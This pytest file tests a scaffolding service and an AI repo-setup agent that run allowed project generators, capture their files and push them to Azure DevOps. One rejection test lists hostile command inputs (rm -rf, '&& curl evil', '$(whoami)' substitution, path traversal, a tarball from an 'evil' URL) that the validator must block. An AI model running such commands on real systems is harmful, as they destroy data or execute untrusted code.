"""
Command-based scaffolding: command validation, exact capture of the generated files, safe execution (no shell,
no secrets, timeouts, no fallback), and the Repo Setup Agent flow on top of it (scaffold -> requested changes ->
push as generator commit + changes commit -> re-scaffold). Generators are faked here; tests marked `integration`
run the real `uv` CLI.
"""
import base64
import os
import shutil
import subprocess

import pytest

from app.services import project_store as store
from app.services import scaffold_service as ss
from app.services.agents import repo_setup_agent as rsa
from app.services.conversation_service import render_structure_for_display
from app.services.mcp.ado_git_push import AdoPushError, Base64Content, build_changes_body
from app.services.repo_structure import layer_changes
from tests.fake_supabase import FakeSupabase

pytestmark = pytest.mark.usefixtures("no_real_network")

CONV = "conv-scaffold-test"
PNG = b"\x89PNG\r\n\x1a\n\x00\x00binary"


# ---------------------------------------------------------------------------
# Fakes: generators that write files, ADO, database
# ---------------------------------------------------------------------------

def _write(root, rel, data):
    path = os.path.join(root, *rel.split("/"))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as handle:
        handle.write(data if isinstance(data, bytes) else data.encode("utf-8"))


def fake_generators(cwd, args):
    """Mimics the real generators' output (see the integration test for the real thing)."""
    exe, rest = os.path.basename(args[0]), args[1:]
    if exe == "uv" and rest[0] == "init":
        target = cwd if rest[-1] == "." else os.path.join(cwd, rest[-1])
        name = rest[rest.index("--name") + 1] if "--name" in rest else os.path.basename(target)
        _write(target, "README.md", "")                                    # uv writes an empty README
        _write(target, ".python-version", "3.12\n")
        _write(target, "pyproject.toml", f'[project]\nname = "{name}"\ndependencies = []\n')
        if "--package" in rest:
            _write(target, f"src/{name.replace('-', '_')}/__init__.py", 'def main() -> None:\n    print("Hello")\n')
        else:
            _write(target, "main.py", 'def main():\n    print("Hello")\n')
        _write(target, ".venv/pyvenv.cfg", "ignored")                     # tool folders are never captured
        return 0, "Initialized project", ""
    if exe == "uv" and rest[0] == "add":
        pkg = [a for a in rest[1:] if not a.startswith("-")][0]
        with open(os.path.join(cwd, "pyproject.toml"), "a", encoding="utf-8") as handle:
            handle.write(f'# dependency: {pkg}\n')
        _write(cwd, "uv.lock", f"version = 1\n# {pkg}\n" + "x" * 5000)
        return 0, "Resolved", ""
    if exe == "npx" and "create-vite@latest" in rest[:-1]:
        target = rest[rest.index("create-vite@latest") + 1]
        root = cwd if target == "." else os.path.join(cwd, target)
        _write(root, "package.json", '{"name": "frontend"}\r\n')        # CRLF must survive
        _write(root, "src/main.tsx", "import App from './App'\n")
        _write(root, "src/assets/hero.png", PNG)
        _write(root, "node_modules/react/index.js", "ignored")
        os.makedirs(os.path.join(root, "public", "empty"), exist_ok=True)  # empty folder: reported, not filled
        return 0, "Done", ""
    if exe == "npm" and rest[0] == "run":
        raise AssertionError("must have been rejected before running")
    return 1, "", f"unknown fake command {args}"


@pytest.fixture
def runner(monkeypatch):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append({"argv": argv, **kwargs})
        code, out, err = fake_generators(kwargs["cwd"], argv)
        return subprocess.CompletedProcess(argv, code, out, err)

    monkeypatch.setattr(ss, "_resolve_executable", lambda name: f"/usr/bin/{name}" if name in ("uv", "npx", "npm") else None)
    monkeypatch.setattr(ss.subprocess, "run", fake_run)
    return calls


@pytest.fixture
def db(monkeypatch):
    fake = FakeSupabase()
    monkeypatch.setattr(store, "client_factory", lambda: fake)
    return fake


class AdoCalls(list):
    fail_changes = False


@pytest.fixture
def ado(monkeypatch):
    calls = AdoCalls()
    counter = iter(range(1, 100))

    def create_project(project_name, project_description):
        calls.append(("create_ado_project", project_name))
        return {"status": "success", "name": project_name, "description": project_description, "id": "proj-guid",
                "url": f"https://dev.azure.com/org/{project_name}"}

    def create_repo(project_id_or_name, repository_name):
        calls.append(("create_ado_repository", project_id_or_name, repository_name))
        return {"status": "success", "name": repository_name, "id": "repo-guid",
                "url": f"https://dev.azure.com/org/p/_git/{repository_name}"}

    def push(project_id_or_name, repository_name, files, commit_message=None, branch=None, allow_empty=False):
        calls.append(("push_repository_files", [dict(f) for f in files], commit_message, allow_empty))
        n = next(counter)
        return {"status": "success", "commit_id": f"c{n}", "commit_message": commit_message, "branch": "main",
                "files_count": len(files), "commit_url": f"https://x/commit/c{n}"}

    def push_changes(project_id_or_name, repository_name, base_files, files, commit_message=None, branch=None,
                     allow_empty=False):
        calls.append(("push_repository_changes", [dict(f) for f in base_files], [dict(f) for f in files],
                      commit_message, branch, allow_empty))
        if calls.fail_changes:
            return {"status": "error", "error_type": "HTTP_ERROR", "message": "boom", "details": ""}
        n = next(counter)
        return {"status": "success", "commit_id": f"c{n}", "commit_message": commit_message, "branch": "main",
                "files_count": len(files), "commit_url": f"https://x/commit/c{n}",
                "changes": layer_changes(base_files, files)}

    monkeypatch.setattr(rsa, "create_ado_project", create_project)
    monkeypatch.setattr(rsa, "create_ado_repository", create_repo)
    monkeypatch.setattr(rsa, "push_repository_files", push)
    monkeypatch.setattr(rsa, "push_repository_changes", push_changes)
    return calls


def call(tools, name, **kwargs):
    tool = next(t for t in tools if t.name == name)
    return getattr(tool, "func", tool)(**kwargs)


def created_repo(db, ado, repo_name="taskflow-cli"):
    tools = rsa.build_repo_setup_tools(CONV)
    call(tools, "create_ado_project", project_name="Taskflow", project_description="CLI")
    call(tools, "create_ado_repository", project_id_or_name="Taskflow", repository_name=repo_name)
    return tools


CLI_COMMANDS = [{"command": "uv init --package --vcs none --name taskflow-cli ."},
                {"command": "uv add --no-sync typer"}]
FULLSTACK_COMMANDS = [{"command": "npx --yes create-vite@latest frontend --template react-ts"},
                      {"command": "uv init --app --vcs none --name backend backend"},
                      {"command": "uv add --no-sync fastapi[standard]", "cwd": "backend"}]


def repository(db):
    return db.tables["Repository"][0]


# ---------------------------------------------------------------------------
# Command validation
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "npx --yes create-vite@latest frontend --template react-ts",
    "npm create vite@latest web -- --template vue",
    "uv init --package --vcs none --name my-cli .",
    "uv add --no-sync fastapi[standard]",
    "npx --yes -p typescript tsc --init",
    "dotnet new webapi -o Api --no-restore",
    "uvx --from django django-admin startproject site .",
    "npx --yes create-next-app@latest web --ts --import-alias @/* --skip-install",
    "cargo init --name tool --vcs none",
])
def test_parse_command_accepts_generators(command):
    parsed, args = ss.parse_command({"command": command})
    assert parsed.command == command and args[0] in ss.ALLOWED_COMMANDS


@pytest.mark.parametrize("command, fragment", [
    ("rm -rf x", "not an allowed scaffold executable"),
    ("git clone x", "not an allowed scaffold executable"),
    ("npm run build", "`npm run` is not allowed"),
    ("uv run main.py", "`uv run` is not allowed"),
    ("npx evil-package", "not on the allow-list"),
    ("npm create evil", "'create-evil' is not on the allow-list"),
    ("npx -p typescript -p evil tsc", "'evil' is not on the allow-list"),
    ("uvx --python 3.12 evil", "'evil' is not on the allow-list"),
    ("uvx --with evil --from django django-admin", "--with"),
    ("dotnet new install Evil.Templates", "Installing dotnet templates"),
    ("npx create-vite x && curl evil", "not allowed"),
    ("npx create-vite $(whoami)", "not allowed"),
    ("npx create-vite x > out.txt", "not allowed"),
    ("npx create-vite ../outside", "absolute path or contain '..'"),
    ("npm install --prefix=C:/Windows x", "absolute path"),
    ("npm install https://evil/x.tgz", "URL"),
    ("uv add fastapi>=0.1", "not allowed"),
    ("", "must not be empty"),
])
def test_parse_command_rejects_unsafe_commands(command, fragment):
    with pytest.raises(AdoPushError, match=None) as info:
        ss.parse_command({"command": command})
    assert fragment in info.value.message
    assert info.value.error_type in ("COMMAND_NOT_ALLOWED", "VALIDATION_ERROR")


def test_parse_command_rejects_cwd_outside_the_repository():
    with pytest.raises(AdoPushError, match="relative folder"):
        ss.parse_command({"command": "uv add typer", "cwd": "../x"})


def test_npm_install_never_runs_dependency_scripts():
    _, args = ss.parse_command({"command": "npm install commander --package-lock-only"})
    assert args[-1] == "--ignore-scripts"


def test_extra_generator_packages_can_be_allowed(monkeypatch):
    monkeypatch.setenv("SCAFFOLD_ALLOWED_PACKAGES", "create-my-template")
    ss.parse_command({"command": "npx --yes create-my-template app"})


# ---------------------------------------------------------------------------
# Running commands and capturing their exact output
# ---------------------------------------------------------------------------

def test_runs_commands_in_order_and_captures_exact_output(runner):
    result = ss.run_scaffold_commands(FULLSTACK_COMMANDS)
    files = {f["path"]: f for f in result.files}
    assert sorted(files) == [
        "/backend/.python-version", "/backend/README.md", "/backend/main.py", "/backend/pyproject.toml",
        "/backend/uv.lock", "/frontend/package.json", "/frontend/src/assets/hero.png", "/frontend/src/main.tsx"]
    assert files["/backend/README.md"]["content"] == ""                       # empty file kept as generated
    assert files["/frontend/package.json"]["content"] == '{"name": "frontend"}\r\n'
    assert files["/frontend/src/assets/hero.png"] == {
        "path": "/frontend/src/assets/hero.png", "content": base64.b64encode(PNG).decode(), "encoding": "base64"}
    assert "# dependency: fastapi[standard]" in files["/backend/pyproject.toml"]["content"]
    assert result.skipped["ignored_folders"] == ["/backend/.venv", "/frontend/node_modules"]
    assert result.skipped["empty_folders"] == ["/frontend/public/empty"]
    # order, working folders and execution settings
    assert [os.path.basename(c["argv"][0]) for c in runner] == ["npx", "uv", "uv"]
    assert runner[2]["cwd"].replace("\\", "/").endswith("/backend")
    assert all(c["shell"] is False and c["stdin"] == subprocess.DEVNULL and c["timeout"] for c in runner)
    assert [c.to_dict() for c in result.commands] == [{"command": c["command"], "cwd": c.get("cwd", ".")}
                                                      for c in FULLSTACK_COMMANDS]


def test_commands_get_no_secrets_and_run_non_interactively(runner, monkeypatch):
    monkeypatch.setenv("AZURE_DEVOPS_PAT", "secret-pat")
    monkeypatch.setenv("SUPABASE_SERVICE_ROLE_KEY", "secret-key")
    monkeypatch.setenv("AZURE_OPENAI_APIKEY", "secret-openai")
    ss.run_scaffold_commands(CLI_COMMANDS)
    env = runner[0]["env"]
    assert not {"AZURE_DEVOPS_PAT", "SUPABASE_SERVICE_ROLE_KEY", "AZURE_OPENAI_APIKEY"} & set(env)
    assert env["CI"] == "true" and env["npm_config_yes"] == "true"


def test_single_application_is_generated_at_the_repository_root(runner):
    paths = [f["path"] for f in ss.run_scaffold_commands(CLI_COMMANDS).files]
    assert paths == ["/.python-version", "/README.md", "/pyproject.toml", "/src/taskflow_cli/__init__.py", "/uv.lock"]


def test_failed_command_is_reported_with_output_and_nothing_is_invented(runner):
    with pytest.raises(AdoPushError) as info:
        ss.run_scaffold_commands([{"command": "uv init --app --vcs none x"}, {"command": "npx --yes create-vite@latest"}])
    assert info.value.error_type == "COMMAND_FAILED" and "unknown fake command" in info.value.details


def test_invalid_command_stops_before_anything_runs(runner):
    with pytest.raises(AdoPushError, match="not allowed"):
        ss.run_scaffold_commands([{"command": "uv init --app x"}, {"command": "npm run build"}])
    assert runner == []


def test_missing_toolchain_is_reported_before_running(runner):
    with pytest.raises(AdoPushError) as info:
        ss.run_scaffold_commands([{"command": "uv init x"}, {"command": "dotnet new console -o app"}])
    assert info.value.error_type == "TOOL_NOT_INSTALLED" and runner == []


def test_timeout_is_reported(monkeypatch):
    monkeypatch.setattr(ss, "_resolve_executable", lambda name: "/usr/bin/uv")

    def slow(argv, **kwargs):
        raise subprocess.TimeoutExpired(argv, kwargs["timeout"])

    monkeypatch.setattr(ss.subprocess, "run", slow)
    with pytest.raises(AdoPushError) as info:
        ss.run_scaffold_commands([{"command": "uv init x"}], timeout_seconds=5)
    assert info.value.error_type == "COMMAND_TIMEOUT"


def test_commands_that_produce_nothing_fail(monkeypatch):
    monkeypatch.setattr(ss, "_resolve_executable", lambda name: "/usr/bin/uv")
    monkeypatch.setattr(ss.subprocess, "run", lambda argv, **kw: subprocess.CompletedProcess(argv, 0, "", ""))
    with pytest.raises(AdoPushError) as info:
        ss.run_scaffold_commands([{"command": "uv lock"}])
    assert info.value.error_type == "SCAFFOLD_EMPTY"


def test_collect_files_does_not_follow_symlinks(tmp_path):
    (tmp_path / "a.txt").write_text("a")
    outside = tmp_path.parent / f"outside-{tmp_path.name}.txt"
    outside.write_text("secret")
    try:
        os.symlink(outside, tmp_path / "link.txt")
    except (OSError, NotImplementedError):
        pytest.skip("symlinks need extra privileges on this machine")
    files, skipped = ss.collect_files(str(tmp_path))
    assert [f["path"] for f in files] == ["/a.txt"] and skipped["symlinks"] == ["/link.txt"]


def test_binary_files_are_pushed_base64_encoded():
    body = build_changes_body("main", "0" * 40, "msg", [("add", "/a.png", Base64Content("iVBO")), ("add", "/b.txt", "")])
    changes = body["commits"][0]["changes"]
    assert changes[0]["newContent"] == {"content": "iVBO", "contentType": "base64encoded"}
    assert changes[1]["newContent"] == {"content": "", "contentType": "rawtext"}


# ---------------------------------------------------------------------------
# Repo Setup Agent: scaffold -> review -> push (generator commit + requested-changes commit)
# ---------------------------------------------------------------------------

def test_scaffold_tool_saves_exact_generator_output_and_commands(db, ado, runner):
    tools = created_repo(db, ado)
    result = call(tools, "scaffold_repository_structure", commands=[rsa.ScaffoldCommandInput(**c) for c in CLI_COMMANDS])
    assert result["status"] == "success" and result["files_count"] == 5
    assert result["commands"] == [{"command": c["command"], "cwd": "."} for c in CLI_COMMANDS]
    repo = repository(db)
    assert repo["structure"] == repo["scaffold_structure"]
    assert repo["scaffold_commands"] == result["commands"]
    assert store.get_project(CONV)["workflow_stage"] == store.STAGE_STRUCTURE_REVIEW


def test_scaffold_errors_are_returned_to_the_agent_without_saving(db, ado, runner):
    tools = created_repo(db, ado)
    result = call(tools, "scaffold_repository_structure", commands=[{"command": "npx evil-package"}])
    assert result["status"] == "error" and result["error_type"] == "COMMAND_NOT_ALLOWED"
    assert repository(db).get("structure") is None


def test_create_repository_does_not_create_files(db, ado, runner):
    created_repo(db, ado)
    assert repository(db).get("structure") is None and runner == []


def test_push_without_changes_is_one_commit_of_the_generator_output(db, ado, runner):
    tools = created_repo(db, ado)
    call(tools, "scaffold_repository_structure", commands=CLI_COMMANDS)
    result = call(tools, "push_repository_structure")
    pushes = [c for c in ado if c[0].startswith("push_")]
    assert len(pushes) == 1 and pushes[0][0] == "push_repository_files"
    assert pushes[0][1] == repository(db)["scaffold_structure"] and pushes[0][3] is True   # allow_empty (README.md)
    assert pushes[0][2].startswith(rsa.SCAFFOLD_COMMIT_MESSAGE) and "$ uv add --no-sync typer" in pushes[0][2]
    assert result["push_type"] == "initial commit" and len(result["commits"]) == 1
    assert repository(db)["pushed_structure"] == repository(db)["structure"]
    assert store.get_project(CONV)["workflow_stage"] == store.STAGE_COMPLETE


def test_requested_changes_are_pushed_as_a_second_commit(db, ado, runner):
    tools = created_repo(db, ado)
    call(tools, "scaffold_repository_structure", commands=CLI_COMMANDS)
    updated = call(tools, "update_repository_structure", upsert_files=[
        rsa.RepositoryFile(path="/src/taskflow_cli/commands/__init__.py", content='"""Subcommands."""\n'),
        rsa.RepositoryFile(path="/.github/workflows/ci.yml", content="name: CI\non: [push]\n")])
    assert updated["changes_on_top_of_generated_files"]["add"] == [
        "/.github/workflows/ci.yml", "/src/taskflow_cli/commands/__init__.py"]

    result = call(tools, "push_repository_structure", commit_message="feat: add commands package and CI")
    first, second = [c for c in ado if c[0].startswith("push_")]
    scaffold = repository(db)["scaffold_structure"]
    assert first[0] == "push_repository_files" and first[1] == scaffold
    assert first[2].startswith(rsa.SCAFFOLD_COMMIT_MESSAGE)
    assert second[0] == "push_repository_changes" and second[1] == scaffold
    assert second[2] == repository(db)["structure"] and second[3] == "feat: add commands package and CI"
    assert [c["kind"] for c in result["commits"]] == ["generator output", "requested changes"]
    assert result["commits"][1]["changes"]["add"] == ["/.github/workflows/ci.yml", "/src/taskflow_cli/commands/__init__.py"]
    assert repository(db)["pushed_structure"] == repository(db)["structure"]
    assert repository(db)["commit_id"] == result["commits"][1]["commit_id"]
    assert store.get_project(CONV)["workflow_stage"] == store.STAGE_COMPLETE


def test_failed_second_commit_keeps_the_generator_commit_and_retries_only_the_changes(db, ado, runner):
    tools = created_repo(db, ado)
    call(tools, "scaffold_repository_structure", commands=CLI_COMMANDS)
    call(tools, "update_repository_structure", upsert_files=[{"path": "/docs/usage.md", "content": "# Usage\n"}])
    ado.fail_changes = True
    failed = call(tools, "push_repository_structure")
    assert failed["status"] == "error" and failed["generator_commit"]["kind"] == "generator output"
    assert repository(db)["pushed_structure"] == repository(db)["scaffold_structure"]
    assert store.STRUCTURE_CHANGES_NOT_PUSHED in store.outdated_items(store.get_workflow_state(CONV))

    ado.fail_changes = False
    retried = call(tools, "push_repository_structure")
    last = [c for c in ado if c[0].startswith("push_")][-1]
    assert last[0] == "push_repository_changes" and retried["push_type"] == "follow-up commit"
    assert retried["changes"]["add"] == ["/docs/usage.md"]


def test_rescaffold_for_a_new_stack_replaces_the_structure_and_reports_earlier_changes(db, ado, runner):
    tools = created_repo(db, ado)
    call(tools, "scaffold_repository_structure", commands=CLI_COMMANDS)
    call(tools, "update_repository_structure", upsert_files=[{"path": "/docs/usage.md", "content": "# Usage\n"}])
    result = call(tools, "scaffold_repository_structure", commands=FULLSTACK_COMMANDS)
    assert result["previous_requested_changes"]["add"] == ["/docs/usage.md"]
    assert "/pyproject.toml" not in result["paths"] and "/frontend/src/main.tsx" in result["paths"]
    repo = repository(db)
    assert repo["structure"] == repo["scaffold_structure"] and repo["scaffold_commands"][0]["command"].startswith("npx")
    readded = call(tools, "update_repository_structure", upsert_files=[{"path": "/docs/usage.md", "content": "# Usage\n"}])
    assert readded["changes_on_top_of_generated_files"]["add"] == ["/docs/usage.md"]


def test_hand_written_structure_clears_the_generator_record(db, ado, runner):
    tools = created_repo(db, ado)
    call(tools, "scaffold_repository_structure", commands=CLI_COMMANDS)
    call(tools, "save_repository_structure", files=[{"path": "/README.md", "content": "# Mine\n"}])
    assert repository(db)["scaffold_structure"] is None and repository(db)["scaffold_commands"] is None
    call(tools, "push_repository_structure")
    assert [c[0] for c in ado if c[0].startswith("push_")] == ["push_repository_files"]


def test_without_migration_005_everything_is_pushed_as_one_commit(monkeypatch, ado, runner):
    fake = FakeSupabase(missing_columns={"scaffold_commands", "scaffold_structure"})
    monkeypatch.setattr(store, "client_factory", lambda: fake)
    tools = created_repo(fake, ado)
    result = call(tools, "scaffold_repository_structure", commands=CLI_COMMANDS)
    assert result["status"] == "success" and "Migration 005" in result["warning"]
    call(tools, "update_repository_structure", upsert_files=[{"path": "/docs/usage.md", "content": "# Usage\n"}])
    pushed = call(tools, "push_repository_structure")
    assert pushed["status"] == "success" and len([c for c in ado if c[0].startswith("push_")]) == 1


def test_display_shows_commands_markers_and_commit_plan(db, ado, runner):
    tools = created_repo(db, ado)
    call(tools, "scaffold_repository_structure", commands=FULLSTACK_COMMANDS)
    call(tools, "update_repository_structure", upsert_files=[{"path": "/backend/app/auth/__init__.py", "content": '"""Auth."""\n'}])
    text = render_structure_for_display(store.get_workflow_state(CONV))
    assert "npx --yes create-vite@latest frontend --template react-ts" in text
    assert "uv add --no-sync fastapi[standard]    # in backend/" in text
    assert "__init__.py  (added)" in text and "hero.png" in text
    assert "two commits" in text and "(9 files)" not in text


def test_agent_context_lists_paths_but_not_generated_contents(db, ado, runner):
    tools = created_repo(db, ado)
    call(tools, "scaffold_repository_structure", commands=FULLSTACK_COMMANDS)
    call(tools, "update_repository_structure", upsert_files=[{"path": "/docs/usage.md", "content": "# Usage guide\n"}])
    text = store.describe_workflow_state(store.get_workflow_state(CONV), include_structure=True)
    assert "- /backend/uv.lock (" in text and "[generated]" in text and "xxxxx" not in text
    assert "- /docs/usage.md (14 bytes) [added]" in text and "# Usage guide" in text
    assert "binary" in text and "create-vite" in text


def test_agent_registers_scaffold_tool_with_command_list():
    from agent_framework.openai import OpenAIChatCompletionClient
    client = OpenAIChatCompletionClient(model="test", api_key="k", azure_endpoint="https://example.openai.azure.com",
                                        api_version="2024-12-01-preview")
    agent = rsa.get_repo_setup_agent(client, CONV)
    tool = next(t for t in agent.default_options["tools"] if t.name == "scaffold_repository_structure")
    schema = str(tool.to_json_schema_spec() if hasattr(tool, "to_json_schema_spec") else tool.parameters())
    assert "commands" in schema and "cwd" in schema
    instructions = agent.default_options["instructions"]
    assert "SCAFFOLD COMMAND RULES" in instructions and "Do NOT create frontend/ or backend/ folders" in instructions


# ---------------------------------------------------------------------------
# Real generator (opt-in: needs uv; `uv init` works offline)
# ---------------------------------------------------------------------------

@pytest.mark.integration
@pytest.mark.skipif(not shutil.which("uv"), reason="uv is not installed")
def test_real_uv_init_output_is_captured_exactly():
    result = ss.run_scaffold_commands([{"command": "uv init --package --vcs none --name demo-cli ."}])
    files = {f["path"]: f["content"] for f in result.files}
    assert {"/pyproject.toml", "/README.md", "/.python-version", "/src/demo_cli/__init__.py"} <= set(files)
    assert 'name = "demo-cli"' in files["/pyproject.toml"] and files["/README.md"] == ""
